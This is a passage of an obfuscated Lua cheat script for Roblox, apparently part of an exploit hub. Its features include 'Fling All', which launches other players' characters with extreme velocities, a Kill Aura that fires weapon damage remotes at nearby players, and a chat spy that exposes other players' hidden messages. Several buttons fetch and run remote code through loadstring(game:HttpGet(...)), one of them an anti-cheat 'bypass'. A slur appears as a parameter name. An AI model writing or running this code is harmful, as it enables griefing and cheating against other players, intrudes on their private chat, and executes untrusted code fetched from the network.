			TABLE_TableIndirection["Humanoid%0"] = TABLE_TableIndirection["Character%0"] and TABLE_TableIndirection["Character%0"]:FindFirstChildOfClass("Humanoid");
			TABLE_TableIndirection["RootPart%0"] = TABLE_TableIndirection["Humanoid%0"] and TABLE_TableIndirection["Humanoid%0"].RootPart;
			TABLE_TableIndirection["TCharacter%0"] = TargetPlayer.Character;
			TABLE_TableIndirection["THumanoid%0"] = nil;
			TABLE_TableIndirection["TRootPart%0"] = nil;
			TABLE_TableIndirection["THead%0"] = nil;
			TABLE_TableIndirection["Accessory%0"] = nil;
			TABLE_TableIndirection["Handle%0"] = nil;
			if TABLE_TableIndirection["TCharacter%0"]:FindFirstChildOfClass("Humanoid") then
				TABLE_TableIndirection["THumanoid%0"] = TABLE_TableIndirection["TCharacter%0"]:FindFirstChildOfClass("Humanoid");
			end
			if (TABLE_TableIndirection["THumanoid%0"] and TABLE_TableIndirection["THumanoid%0"].RootPart) then
				TABLE_TableIndirection["TRootPart%0"] = TABLE_TableIndirection["THumanoid%0"].RootPart;
			end
			if TABLE_TableIndirection["TCharacter%0"]:FindFirstChild("Head") then
				TABLE_TableIndirection["THead%0"] = TABLE_TableIndirection["TCharacter%0"].Head;
			end
			if TABLE_TableIndirection["TCharacter%0"]:FindFirstChildOfClass("Accessory") then
				TABLE_TableIndirection["Accessory%0"] = TABLE_TableIndirection["TCharacter%0"]:FindFirstChildOfClass("Accessory");
			end
			if (Accessoy and TABLE_TableIndirection["Accessory%0"]:FindFirstChild("Handle")) then
				TABLE_TableIndirection["Handle%0"] = TABLE_TableIndirection["Accessory%0"].Handle;
			end
			if (TABLE_TableIndirection["Character%0"] and TABLE_TableIndirection["Humanoid%0"] and TABLE_TableIndirection["RootPart%0"]) then
				if (TABLE_TableIndirection["RootPart%0"].Velocity.Magnitude < 50) then
					getgenv().OldPos = TABLE_TableIndirection["RootPart%0"].CFrame;
				end
				if (TABLE_TableIndirection["THumanoid%0"] and TABLE_TableIndirection["THumanoid%0"].Sit and not TABLE_TableIndirection["AllBool%0"]) then
					return Message("Error Occurred", "Targeting is sitting", 5);
				end
				if TABLE_TableIndirection["THead%0"] then
					workspace.CurrentCamera.CameraSubject = TABLE_TableIndirection["THead%0"];
				elseif (not TABLE_TableIndirection["THead%0"] and TABLE_TableIndirection["Handle%0"]) then
					workspace.CurrentCamera.CameraSubject = TABLE_TableIndirection["Handle%0"];
				elseif (TABLE_TableIndirection["THumanoid%0"] and TABLE_TableIndirection["TRootPart%0"]) then
					workspace.CurrentCamera.CameraSubject = TABLE_TableIndirection["THumanoid%0"];
				end
				if not TABLE_TableIndirection["TCharacter%0"]:FindFirstChildWhichIsA("BasePart") then
					return;
				end
				local FPos = function(BasePart, Pos, Ang)
					TABLE_TableIndirection["RootPart%0"].CFrame = CFrame.new(BasePart.Position) * Pos * Ang;
					TABLE_TableIndirection["Character%0"]:SetPrimaryPartCFrame(CFrame.new(BasePart.Position) * Pos * Ang);
					TABLE_TableIndirection["RootPart%0"].Velocity = Vector3.new(90000000, 90000000 * 10, 90000000);
					TABLE_TableIndirection["RootPart%0"].RotVelocity = Vector3.new(900000000, 900000000, 900000000);
				end;
				local SFBasePart = function(BasePart)
					TABLE_TableIndirection["TimeToWait%0"] = 2;
					TABLE_TableIndirection["Time%1"] = tick();
					TABLE_TableIndirection["Angle%0"] = 0;
					repeat
						if (TABLE_TableIndirection["RootPart%0"] and TABLE_TableIndirection["THumanoid%0"]) then
							if (BasePart.Velocity.Magnitude < 50) then
								TABLE_TableIndirection["Angle%0"] = TABLE_TableIndirection["Angle%0"] + 100;
								FPos(BasePart, CFrame.new(0, 1.5, 0) + ((TABLE_TableIndirection["THumanoid%0"].MoveDirection * BasePart.Velocity.Magnitude) / 1.25), CFrame.Angles(math.rad(TABLE_TableIndirection["Angle%0"]), 0, 0));
								task.wait();
								FPos(BasePart, CFrame.new(0, -1.5, 0) + ((TABLE_TableIndirection["THumanoid%0"].MoveDirection * BasePart.Velocity.Magnitude) / 1.25), CFrame.Angles(math.rad(TABLE_TableIndirection["Angle%0"]), 0, 0));
								task.wait();
								FPos(BasePart, CFrame.new(2.25, 1.5, -2.25) + ((TABLE_TableIndirection["THumanoid%0"].MoveDirection * BasePart.Velocity.Magnitude) / 1.25), CFrame.Angles(math.rad(TABLE_TableIndirection["Angle%0"]), 0, 0));
								task.wait();
								FPos(BasePart, CFrame.new(-2.25, -1.5, 2.25) + ((TABLE_TableIndirection["THumanoid%0"].MoveDirection * BasePart.Velocity.Magnitude) / 1.25), CFrame.Angles(math.rad(TABLE_TableIndirection["Angle%0"]), 0, 0));
								task.wait();
								FPos(BasePart, CFrame.new(0, 1.5, 0) + TABLE_TableIndirection["THumanoid%0"].MoveDirection, CFrame.Angles(math.rad(TABLE_TableIndirection["Angle%0"]), 0, 0));
								task.wait();
								FPos(BasePart, CFrame.new(0, -1.5, 0) + TABLE_TableIndirection["THumanoid%0"].MoveDirection, CFrame.Angles(math.rad(TABLE_TableIndirection["Angle%0"]), 0, 0));
								task.wait();
							else
								FPos(BasePart, CFrame.new(0, 1.5, TABLE_TableIndirection["THumanoid%0"].WalkSpeed), CFrame.Angles(math.rad(90), 0, 0));
								task.wait();
								FPos(BasePart, CFrame.new(0, -1.5, -TABLE_TableIndirection["THumanoid%0"].WalkSpeed), CFrame.Angles(0, 0, 0));
								task.wait();
								FPos(BasePart, CFrame.new(0, 1.5, TABLE_TableIndirection["THumanoid%0"].WalkSpeed), CFrame.Angles(math.rad(90), 0, 0));
								task.wait();
								FPos(BasePart, CFrame.new(0, 1.5, TABLE_TableIndirection["TRootPart%0"].Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0));
								task.wait();
								FPos(BasePart, CFrame.new(0, -1.5, -TABLE_TableIndirection["TRootPart%0"].Velocity.Magnitude / 1.25), CFrame.Angles(0, 0, 0));
								task.wait();
								FPos(BasePart, CFrame.new(0, 1.5, TABLE_TableIndirection["TRootPart%0"].Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0));
								task.wait();
								FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(90), 0, 0));
								task.wait();
								FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0));
								task.wait();
								FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(-90), 0, 0));
								task.wait();
								FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0));
								task.wait();
							end
						else
							break;
						end
					until (BasePart.Velocity.Magnitude > 500) or (BasePart.Parent ~= TargetPlayer.Character) or (TargetPlayer.Parent ~= TABLE_TableIndirection["Players%0"]) or (not TargetPlayer.Character == TABLE_TableIndirection["TCharacter%0"]) or TABLE_TableIndirection["THumanoid%0"].Sit or (TABLE_TableIndirection["Humanoid%0"].Health <= 0) or (tick() > (TABLE_TableIndirection["Time%1"] + TABLE_TableIndirection["TimeToWait%0"])) 
				end;
				workspace.FallenPartsDestroyHeight = NaN;
				TABLE_TableIndirection["BV%0"] = Instance.new("BodyVelocity");
				TABLE_TableIndirection["BV%0"].Name = "EpixVel";
				TABLE_TableIndirection["BV%0"].Parent = TABLE_TableIndirection["RootPart%0"];
				TABLE_TableIndirection["BV%0"].Velocity = Vector3.new(900000000, 900000000, 900000000);
				TABLE_TableIndirection["BV%0"].MaxForce = Vector3.new(1 / 0, 1 / 0, 1 / 0);
				TABLE_TableIndirection["Humanoid%0"]:SetStateEnabled(Enum.HumanoidStateType.Seated, false);
				if (TABLE_TableIndirection["TRootPart%0"] and TABLE_TableIndirection["THead%0"]) then
					if ((TABLE_TableIndirection["TRootPart%0"].CFrame.p - TABLE_TableIndirection["THead%0"].CFrame.p).Magnitude > 5) then
						SFBasePart(TABLE_TableIndirection["THead%0"]);
					else
						SFBasePart(TABLE_TableIndirection["TRootPart%0"]);
					end
				elseif (TABLE_TableIndirection["TRootPart%0"] and not TABLE_TableIndirection["THead%0"]) then
					SFBasePart(TABLE_TableIndirection["TRootPart%0"]);
				elseif (not TABLE_TableIndirection["TRootPart%0"] and TABLE_TableIndirection["THead%0"]) then
					SFBasePart(TABLE_TableIndirection["THead%0"]);
				elseif (not TABLE_TableIndirection["TRootPart%0"] and not TABLE_TableIndirection["THead%0"] and TABLE_TableIndirection["Accessory%0"] and TABLE_TableIndirection["Handle%0"]) then
					SFBasePart(TABLE_TableIndirection["Handle%0"]);
				else
					return Message("Error Occurred", "Target is missing everything", 5);
				end
				TABLE_TableIndirection["BV%0"]:Destroy();
				TABLE_TableIndirection["Humanoid%0"]:SetStateEnabled(Enum.HumanoidStateType.Seated, true);
				workspace.CurrentCamera.CameraSubject = TABLE_TableIndirection["Humanoid%0"];
				repeat
					TABLE_TableIndirection["RootPart%0"].CFrame = getgenv().OldPos * CFrame.new(0, 0.5, 0);
					TABLE_TableIndirection["Character%0"]:SetPrimaryPartCFrame(getgenv().OldPos * CFrame.new(0, 0.5, 0));
					TABLE_TableIndirection["Humanoid%0"]:ChangeState("GettingUp");
					table.foreach(TABLE_TableIndirection["Character%0"]:GetChildren(), function(_, x)
						if x:IsA("BasePart") then
							x.Velocity, x.RotVelocity = Vector3.new(), Vector3.new();
						end
					end);
					task.wait();
				until (TABLE_TableIndirection["RootPart%0"].Position - getgenv().OldPos.p).Magnitude < 25 
				workspace.FallenPartsDestroyHeight = getgenv().FPDH;
			else
				return Message("Error Occurred", "Random error", 5);
			end
		end;
		if not Welcome then
			Message("4imW4r3.xyz", "Fling All", 5);
		end
		getgenv().Welcome = true;
		if TABLE_TableIndirection["Targets%0"][1] then
			for _, x in next, TABLE_TableIndirection["Targets%0"] do
				GetPlayer(x);
			end
		else
			return;
		end
		if TABLE_TableIndirection["AllBool%0"] then
			for _, x in next, TABLE_TableIndirection["Players%0"]:GetPlayers() do
				SkidFling(x);
			end
		end
		for _, x in next, TABLE_TableIndirection["Targets%0"] do
			if (GetPlayer(x) and (GetPlayer(x) ~= TABLE_TableIndirection["Player%1"])) then
				if (GetPlayer(x).UserId ~= 1414978355) then
					TABLE_TableIndirection["TPlayer%0"] = GetPlayer(x);
					if TABLE_TableIndirection["TPlayer%0"] then
						SkidFling(TABLE_TableIndirection["TPlayer%0"]);
					end
				else
					Message("Error Occurred", "This user is whitelisted! (Owner)", 5);
				end
			elseif (not GetPlayer(x) and not TABLE_TableIndirection["AllBool%0"]) then
				Message("Error Occurred", "Username Invalid", 5);
			end
		end
	end);
	TABLE_TableIndirection["MainSS2%0"]:AddToggle("Kill Aura", false, function(x)
		if shared.settings then
			return;
		end
		shared.settings = {killaura=x,maxdistance=30,debugging=true};
		TABLE_TableIndirection["Players%0"] = game:GetService("Players");
		TABLE_TableIndirection["lp%0"] = TABLE_TableIndirection["Players%0"].LocalPlayer or TABLE_TableIndirection["Players%0"]:GetPropertyChangedSignal("LocalPlayer"):Wait() or TABLE_TableIndirection["Players%0"].LocalPlayer;
		local function getchar(plr, yield)
			TABLE_TableIndirection["plr%2"] = plr or TABLE_TableIndirection["lp%0"];
			return TABLE_TableIndirection["plr%2"].Character or (yield and TABLE_TableIndirection["plr%2"].CharacterAdded:Wait());
		end
		local function gethumanoid(plr, yield)
			TABLE_TableIndirection["plr%2"] = plr or TABLE_TableIndirection["lp%0"];
			TABLE_TableIndirection["char%0"] = getchar(TABLE_TableIndirection["plr%2"], yield);
			return (yield and TABLE_TableIndirection["char%0"]:WaitForChild("Humanoid")) or TABLE_TableIndirection["char%0"]:FindFirstChildWhichIsA("Humanoid");
		end
		local function getDamageRemote()
			TABLE_TableIndirection["char%0"] = getchar(nil, true);
			TABLE_TableIndirection["Tool%0"] = TABLE_TableIndirection["char%0"]:FindFirstChildWhichIsA("Tool");
			TABLE_TableIndirection["Remote%0"] = TABLE_TableIndirection["Tool%0"] and TABLE_TableIndirection["Tool%0"]:FindFirstChild("DamageRemote");
			return TABLE_TableIndirection["Remote%0"];
		end
		local function GetClosestPlayer()
			TABLE_TableIndirection["dist%0"] = shared.settings.maxdistance or (1 / 0);
			TABLE_TableIndirection["closest_player%0"] = nil;
			for i, v in next, TABLE_TableIndirection["Players%0"]:GetPlayers() do
				if (v ~= TABLE_TableIndirection["lp%0"]) then
					TABLE_TableIndirection["char%0"] = getchar(v);
					if (TABLE_TableIndirection["char%0"] and not TABLE_TableIndirection["char%0"]:FindFirstChildWhichIsA("ForceField")) then
						TABLE_TableIndirection["BasePart%1"] = TABLE_TableIndirection["char%0"]:FindFirstChildWhichIsA("BasePart");
						TABLE_TableIndirection["Humanoid%0"] = gethumanoid(v);
						TABLE_TableIndirection["DistanceFromTarget%0"] = TABLE_TableIndirection["BasePart%1"] and TABLE_TableIndirection["lp%0"]:DistanceFromCharacter(TABLE_TableIndirection["BasePart%1"].CFrame.Position);
						if (TABLE_TableIndirection["DistanceFromTarget%0"] and (TABLE_TableIndirection["DistanceFromTarget%0"] <= TABLE_TableIndirection["dist%0"]) and TABLE_TableIndirection["Humanoid%0"] and (TABLE_TableIndirection["Humanoid%0"].Health > 0)) then
							TABLE_TableIndirection["dist%0"] = TABLE_TableIndirection["DistanceFromTarget%0"];
							TABLE_TableIndirection["closest_player%0"] = v;
						end
					end
				end
			end
			return TABLE_TableIndirection["closest_player%0"], TABLE_TableIndirection["dist%0"];
		end
		repeat
			TABLE_TableIndirection["DamageRemote%0"] = getDamageRemote();
			if TABLE_TableIndirection["DamageRemote%0"] then
				local Target, Distance = GetClosestPlayer();
				if Target then
					TABLE_TableIndirection["DamageRemote%0"]:FireServer(gethumanoid(Target));
					if shared.settings.debugging then
						warn("Attacked: ", Target, "from", Distance, "studs away");
					end
				end
			end
			task.wait();
		until not shared.settings.killaura 
	end);
	TABLE_TableIndirection["MainSS2%0"]:AddButton("Spy Chat", function(IhateGayPeople)
		enabled = true;
		spyOnMyself = false;
		public = false;
		publicItalics = false;
		privateProperties = {Color=Color3.fromRGB(0, 255, 255),Font=Enum.Font.SourceSansBold,TextSize=18};
		TABLE_TableIndirection["StarterGui%0"] = game:GetService("StarterGui");
		TABLE_TableIndirection["Players%0"] = game:GetService("Players");
		TABLE_TableIndirection["player%1"] = TABLE_TableIndirection["Players%0"].LocalPlayer or TABLE_TableIndirection["Players%0"]:GetPropertyChangedSignal("LocalPlayer"):Wait() or TABLE_TableIndirection["Players%0"].LocalPlayer;
		TABLE_TableIndirection["saymsg%0"] = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest");
		TABLE_TableIndirection["getmsg%0"] = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("OnMessageDoneFiltering");
		TABLE_TableIndirection["instance%0"] = (_G.chatSpyInstance or 0) + 1;
		_G.chatSpyInstance = TABLE_TableIndirection["instance%0"];
		local function onChatted(p, msg)
			if (_G.chatSpyInstance == TABLE_TableIndirection["instance%0"]) then
				if ((p == TABLE_TableIndirection["player%1"]) and (msg:lower():sub(1, 6) == "/e spy")) then
					enabled = not enabled;
					wait(0.3);
					privateProperties.Text = "{SPY " .. ((enabled and "EN") or "DIS") .. "ABLED}";
					TABLE_TableIndirection["StarterGui%0"]:SetCore("ChatMakeSystemMessage", privateProperties);
				elseif (enabled and ((spyOnMyself == true) or (p ~= TABLE_TableIndirection["player%1"]))) then
					msg = msg:gsub("[\n\r]", ""):gsub("\t", " "):gsub("[ ]+", " ");
					TABLE_TableIndirection["hidden%0"] = true;
					TABLE_TableIndirection["conn%0"] = TABLE_TableIndirection["getmsg%0"].OnClientEvent:Connect(function(packet, channel)
						if ((packet.SpeakerUserId == p.UserId) and (packet.Message == msg:sub((#msg - #packet.Message) + 1)) and ((channel == "All") or ((channel == "Team") and (public == false) and (p.Team == TABLE_TableIndirection["player%1"].Team)))) then
							TABLE_TableIndirection["hidden%0"] = false;
						end
					end);
					wait(1);
					TABLE_TableIndirection["conn%0"]:Disconnect();
					if (TABLE_TableIndirection["hidden%0"] and enabled) then
						if public then
							TABLE_TableIndirection["saymsg%0"]:FireServer(((publicItalics and "/me ") or "") .. "{SPY} [" .. p.Name .. "]: " .. msg, "All");
						else
							privateProperties.Text = "{SPY} [" .. p.Name .. "]: " .. msg;
							TABLE_TableIndirection["StarterGui%0"]:SetCore("ChatMakeSystemMessage", privateProperties);
						end
					end
				end
			end
		end
		for _, p in ipairs(TABLE_TableIndirection["Players%0"]:GetPlayers()) do
			p.Chatted:Connect(function(msg)
				onChatted(p, msg);
			end);
		end
		TABLE_TableIndirection["Players%0"].PlayerAdded:Connect(function(p)
			p.Chatted:Connect(function(msg)
				onChatted(p, msg);
			end);
		end);
		privateProperties.Text = "{SPY " .. ((enabled and "EN") or "DIS") .. "ABLED}";
		TABLE_TableIndirection["player%1"]:WaitForChild("PlayerGui"):WaitForChild("Chat");
		TABLE_TableIndirection["StarterGui%0"]:SetCore("ChatMakeSystemMessage", privateProperties);
		wait(3);
		TABLE_TableIndirection["chatFrame%0"] = TABLE_TableIndirection["player%1"].PlayerGui.Chat.Frame;
		TABLE_TableIndirection["chatFrame%0"].ChatChannelParentFrame.Visible = true;
		TABLE_TableIndirection["chatFrame%0"].ChatBarParentFrame.Position = TABLE_TableIndirection["chatFrame%0"].ChatChannelParentFrame.Position + UDim2.new(UDim.new(), TABLE_TableIndirection["chatFrame%0"].ChatChannelParentFrame.Size.Y);
	end);
	TABLE_TableIndirection["MainSS2%0"]:AddButton("Infinite yield", function(IhateGayPeople)
		loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))();
	end);
	TABLE_TableIndirection["MainSS2%0"]:AddButton("CMD X", function(IhateGayPeople)
		loadstring(game:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source", true))();
	end);
	TABLE_TableIndirection["MainSS2%0"]:AddButton("Dex Explorer", function(IhateGayPeople)
		loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/Dex%20Explorer.txt"))();
	end);
	TABLE_TableIndirection["MainSS2%0"]:AddButton("namecallinstance bypass", function(IhateGayPeople)
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Tamim468/releases/main/bypass.lua"))();
	end);
	TABLE_TableIndirection["MainSS2%0"]:AddButton("Anti IP Logger", function(IhateGayPeople)
		loadstring(game:HttpGet("https://raw.githubusercontent.com/worthegoat/wor/main/LuaProtector"))();
	end);
	TABLE_TableIndirection["MainSS3%0"] = TABLE_TableIndirection["Tab1%0"]:CreateSector("Server Testing", "right");
	TABLE_TableIndirection["MainSS3%0"]:AddButton("Serverhop", function(IhateGayPeople)
		TABLE_TableIndirection["servers%0"] = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100"));
		for a, b in pairs(TABLE_TableIndirection["servers%0"].data) do
			if (b.playing ~= b.maxPlayers) then
				game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, b.id);
			end
		end
	end);
	TABLE_TableIndirection["MainSS3%0"]:AddButton("Rejoin", function(IhateGayPeople)
		TABLE_TableIndirection["ts%1"] = game:GetService("TeleportService");
		TABLE_TableIndirection["p%0"] = game:GetService("Players").LocalPlayer;
		TABLE_TableIndirection["ts%1"]:Teleport(game.PlaceId, TABLE_TableIndirection["p%0"]);
	end);
	TABLE_TableIndirection["arsonfuncs%0"].isVisible = function(self, Player)
		if (Player ~= game.Players.LocalPlayer) then
			TABLE_TableIndirection["PlayerCharacter%0"] = Player.Character;
			TABLE_TableIndirection["LocalPlayerCharacter%0"] = game.Players.LocalPlayer.Character;
			TABLE_TableIndirection["GetPartsObscuringTarget%0"] = workspace.CurrentCamera.GetPartsObscuringTarget;
			if not (TABLE_TableIndirection["PlayerCharacter%0"] or TABLE_TableIndirection["LocalPlayerCharacter%0"]) then
				return;
			end
			TABLE_TableIndirection["PlayerRoot%0"] = TABLE_TableIndirection["PlayerCharacter%0"]:FindFirstChild("Head");
			if not TABLE_TableIndirection["PlayerRoot%0"] then
				return;
			end
			local CastPoints, IgnoreList = {TABLE_TableIndirection["PlayerRoot%0"].Position,TABLE_TableIndirection["LocalPlayerCharacter%0"],TABLE_TableIndirection["PlayerCharacter%0"]}, {TABLE_TableIndirection["LocalPlayerCharacter%0"],TABLE_TableIndirection["PlayerCharacter%0"]};
			TABLE_TableIndirection["ObscuringObjects%0"] = #TABLE_TableIndirection["GetPartsObscuringTarget%0"](workspace.CurrentCamera, CastPoints, IgnoreList);
			return ((TABLE_TableIndirection["ObscuringObjects%0"] == 0) and true) or ((TABLE_TableIndirection["ObscuringObjects%0"] > 0) and false);
		end
	end;
	TABLE_TableIndirection["arsonfuncs%0"].RotatePlayer = function(self, cframe)
		TABLE_TableIndirection["Gyro%0"] = Instance.new("BodyGyro");
		TABLE_TableIndirection["Gyro%0"].D = 0;
		TABLE_TableIndirection["Gyro%0"].P = configTable.SpinSpeed * 100;
		TABLE_TableIndirection["Gyro%0"].MaxTorque = Vector3.new(0, configTable.SpinSpeed * 100, 0);
		TABLE_TableIndirection["Gyro%0"].Parent = game.Players.LocalPlayer.Character.UpperTorso;
		TABLE_TableIndirection["Gyro%0"].CFrame = CFrame.new(TABLE_TableIndirection["Gyro%0"].Parent.Position, cframe.Position);
		task.wait();
		TABLE_TableIndirection["Gyro%0"]:Destroy();
	end;
	for _, vls in pairs(game.ReplicatedStorage.Weapons:GetChildren()) do
		if vls:FindFirstChild("FireRate") then
			table.insert(configTable.ReplicatedFireRate, vls.Name);
			configTable[vls.Name] = vls.FireRate.Value;
		end
	end
	for _, vls in pairs(game.ReplicatedStorage.Weapons:GetChildren()) do
		if vls:FindFirstChild("Auto") then
			table.insert(configTable.ReplicatedAuto, vls.Name);
			configTable[vls.Name] = vls.Auto.Value;
		end
	end
	TABLE_TableIndirection["arsonfuncs%0"].Chat = function(self, msg)
		TABLE_TableIndirection["ohString1%0"] = "GRR";
		TABLE_TableIndirection["ohString2%0"] = "yo";
		TABLE_TableIndirection["ohBoolean3%0"] = false;
		TABLE_TableIndirection["ohNil4%0"] = nil;
		TABLE_TableIndirection["ohBoolean5%0"] = false;
		TABLE_TableIndirection["ohBoolean6%0"] = true;
		game:GetService("ReplicatedStorage").Events.PlayerChatted:FireServer(chatKey, msg, TABLE_TableIndirection["ohBoolean3%0"], TABLE_TableIndirection["ohNil4%0"], TABLE_TableIndirection["ohBoolean5%0"], TABLE_TableIndirection["ohBoolean6%0"], nil, nil);
	end;
	TABLE_TableIndirection["MainSS2%0"]:AddToggle("Valkyrie Helmet", false, function(x)
		if x then
			game:GetObjects("rbxassetid://7946401912")[1].Parent = workspace;
			TABLE_TableIndirection["pull%0"] = workspace.Valk.Handle:Clone();
			TABLE_TableIndirection["pull%0"].Parent = workspace;
			TABLE_TableIndirection["pull%0"].Name = "valkyr";
			task.wait(1);
			TABLE_TableIndirection["cl%0"] = workspace.valkyr:Clone();
			TABLE_TableIndirection["cl%0"].Name = "Valkyr";
			TABLE_TableIndirection["cl%0"].Parent = game.Players.LocalPlayer.Character:WaitForChild("Head");
			TABLE_TableIndirection["cl%0"].CFrame = game.Players.LocalPlayer.Character.Head.CFrame;
			TABLE_TableIndirection["w%0"] = Instance.new("Weld");
			TABLE_TableIndirection["w%0"].Name = "funny_weld";
			TABLE_TableIndirection["w%0"].Parent = game.Players.LocalPlayer.Character.Head;
			TABLE_TableIndirection["w%0"].Part0 = game.Players.LocalPlayer.Character.Head;
			TABLE_TableIndirection["w%0"].Part1 = TABLE_TableIndirection["cl%0"];
			TABLE_TableIndirection["w%0"].C0 = CFrame.new(0, 0.8, 0);
			TABLE_TableIndirection["w%0"].C1 = CFrame.Angles(0, math.rad(90), 0);
			task.wait(1);
			workspace.Valk:Destroy();
		elseif (game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Head") and game.Players.LocalPlayer.Character.Head:FindFirstChild("funny_weld")) then
			game.Players.LocalPlayer.Character.Head.funny_weld:Destroy();
			game.Players.LocalPlayer.Character.Head.Valkyr:Destroy();
		end
	end);
elseif is_blacklisted(TABLE_TableIndirection["player%0"]) then
	print(TABLE_TableIndirection["player%0"].Name .. " is not allowed to use the script");
else
	print(TABLE_TableIndirection["player%0"].Name .. " is not whitelisted or blacklisted");
end
